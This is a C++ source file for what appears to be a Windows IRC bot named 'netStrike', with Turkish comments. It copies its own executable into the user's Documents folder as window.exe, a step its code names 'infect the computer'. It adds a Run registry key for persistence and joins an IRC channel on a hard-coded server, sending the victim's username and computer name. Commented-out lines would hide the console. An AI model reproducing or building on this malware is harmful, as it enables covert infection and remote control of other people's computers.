#include <iostream>
#include "IRC_Client.h"
#include <thread>
#include <fstream>
#include <Windows.h>
#include <filesystem>



#pragma comment(lib,"shell32.lib")

using namespace std;
string targetFolder;
string executablePath;
string msg;
 IRC_Client irc_client;
string IP = "192.99.92.223"; //irc.rizon.net

namespace fs = std::experimental::filesystem;
void Communicate()
{
	cout << IP + " ile iletişime geciliyor..." << endl;
	irc_client.Connect();
}

char* getProgramFilesDirectory()
{
	char *dir = getenv("ProgramFiles");
	return dir;
}

inline bool exist()
{
	struct  stat buffer;
	return (stat(targetFolder.c_str(), &buffer) == 0);
}

void kopyala()//çözmeye çalışacağım algoritma ama sanırım binary şeklinde kopyalıyor
{
	clock_t start, end;
	start = clock();

	ifstream source(executablePath, ios::binary);
	ofstream dest(targetFolder, ios::binary);

	dest << source.rdbuf();

	source.close();
	dest.close();

	end = clock();
}

void BilgisayaraBulas()
{
	  kopyala();
}



void writeRegisrty(LPCTSTR subkey, const string& valuename,const string& value)
{
	HKEY key;
	RegOpenKeyEx(HKEY_CURRENT_USER, subkey,0,KEY_ALL_ACCESS, &key);
	RegSetValueExA(key,valuename.c_str(),0,REG_SZ,(LPBYTE)(value.c_str()),(value.size() +1) );
	RegCloseKey(key);
}

inline bool dosya_bulunuyor(const std::string& yol) 
{
	struct stat buffer;
	return (stat(yol.c_str(), &buffer) == 0);
}


int main(int argc, char* argv[])
{
	HWND console = GetConsoleWindow();
	RECT r;
	GetWindowRect(console, &r);

	//console'u asiri kucultup kose itiyoruz ve sakliyoruz
	//MoveWindow(console, r.left, r.top, 1, 1, TRUE);
	//"C:\\Users\\CASPER\\Desktop\\dw\\x1.zip"
	//ShowWindow(GetConsoleWindow(), SW_HIDE);

	 string programFilesDizin = getenv("USERPROFILE");
	 targetFolder = programFilesDizin + "\\Documents\\window.exe";
	executablePath = argv[0];

	cout << targetFolder << endl;
	cout << executablePath << endl;

	string valuenam = "win";
	string datax = targetFolder;


	if (!dosya_bulunuyor(targetFolder))
	{
		cout << ">netStrike hedefte bulunamadi..."<<endl;
		cout << ">kopyalaniyor..." << endl;
		BilgisayaraBulas();
		cout << ">kayit defteri degistiriliyor..." << endl;
		writeRegisrty(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",valuenam,datax);
	}
	else
	{
		cout << ">netStrike bulundu islem durdurluyor..." << endl;
		//exit(1);
	}

	
	string nick = "";
	string user;
	
	nick += getenv("username");
	user = getenv("COMPUTERNAME");
	
	irc_client = IRC_Client(IP, 6667, "#dakdakfer1",nick , user);
	
	system("color a");

	thread communication(Communicate);
	communication.join();
	return 0;
}





